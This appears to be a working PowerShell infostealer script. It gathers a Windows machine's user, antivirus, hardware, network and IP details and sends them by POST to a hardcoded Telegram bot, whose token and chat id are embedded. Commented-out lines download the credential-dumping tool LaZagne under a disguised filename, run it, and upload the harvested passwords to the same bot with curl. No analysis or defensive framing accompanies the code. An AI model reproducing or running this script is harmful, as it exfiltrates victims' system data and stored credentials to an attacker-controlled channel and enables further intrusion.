$token="6106778924:AAGE3OZcz9I1mVCi4BWa2t5vAlqn_-e8m38"
$chatid="1290383336"
$Date = Get-Date
$SystemInfo = Get-CimInstance -ClassName Win32_ComputerSystem
$System = $SystemInfo.Manufacturer + " " + $SystemInfo.Model
$Username = $SystemInfo.UserName
$ComputerName = $env:COMPUTERNAME
$Language = Get-WinSystemLocale |Select-Object -ExpandProperty Name
$Antivirus = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntivirusProduct" | Select-Object -ExpandProperty displayName
$CPU = (Get-CimInstance -ClassName Win32_Processor).Name
$GPU = (Get-CimInstance -ClassName Win32_VideoController).Name
$RAM = "{0:N2} GB" -f ((Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
$Battery = (Get-WmiObject -Class Win32_Battery).EstimatedChargeRemaining
$Webcam = (Get-WmiObject -Class Win32_PnPEntity | Where-Object {$_.Name -like "*webcam*"}).Count
$Gateway = (Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -ExpandProperty NextHop).ToString()
$InternalIP = (Test-Connection -ComputerName (hostname) -Count 1 | Select-Object -ExpandProperty IPV4Address).IPAddressToString
$ExternalIP = Invoke-RestMethod -Uri "https://api.ipify.org/"
$NetworkName = Get-NetAdapter | Where-Object {$_.Status -eq "Up" -and $_.PhysicalMediaType -eq "802.3"} | Select-Object -ExpandProperty Name
$WifiName = Get-NetConnectionProfile | Where-Object {$_.InterfaceAlias -eq $NetworkName} | Select-Object -ExpandProperty Name
#Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -outFile "$env:APPDATA\QwOapSlpsA.exe"
#cmd.exe /C "%appdata%\QwOapSlpsA.exe all > %appdata%\result.txt"
Invoke-RestMethod -Uri 'https://api.telegram.org/bot6106778924:AAGE3OZcz9I1mVCi4BWa2t5vAlqn_-e8m38/sendMessage' -Method 'POST' -Body @{chat_id=$chatid; text="Date: $Date`nSystem: $System`n$Username : $Username`nComputer Name : $ComputerName`nLanguage : $Language`nAntivirus : $Antivirus`nCPU : $CPU`nGPU : $GPU`nRAM : $RAM Battery Percentage : $Battery`n Webcam Count : $webcam`nGateway : $Gateway`nInternal IP : $internalIP`nExternal IP : $ExternalIP`n"}
#cmd.exe /C 'curl -s -X POST h"ttps://api.telegram.org/bot6106778924:AAGE3OZcz9I1mVCi4BWa2t5vAlqn_-e8m38/sendDocument" -F "chat_id=1290383336" -F "document=@%appdata%\result.txt"'
